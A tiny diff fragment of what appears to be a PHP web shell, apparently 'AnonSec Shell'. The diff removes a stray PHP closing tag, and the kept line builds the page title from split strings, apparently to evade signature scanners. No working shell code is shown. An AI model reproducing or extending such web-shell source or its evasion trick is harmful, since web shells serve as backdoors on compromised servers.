@@ -1,5 +1,4 @@
-
-?><!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
 	<?php echo "<title>An"."onS"."ec Sh"."el"."l</title>"; ?>
